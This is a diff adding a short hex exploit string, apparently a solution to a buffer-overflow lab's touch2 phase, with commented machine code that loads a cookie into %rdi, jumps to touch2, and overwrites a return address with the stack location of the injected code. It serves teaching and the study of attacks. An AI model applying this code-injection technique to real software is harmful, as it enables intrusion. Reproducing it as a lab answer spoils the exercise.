@@ -1,0 +1,6 @@
+48 c7 c7 12 71 c4 77 /* mov    $0x77c47112,%rdi #把cookie赋给%rdi */
+48 b8 16 5e 55 55 55 /* movabs $0x555555555e16,%rax #touch2的地址 */
+55 00 00             /* push   %rax */
+50 c3 00             /* retq */
+00 00 00 00
+f8 5a 65 55 00 00 00 /* injected codes'adress */
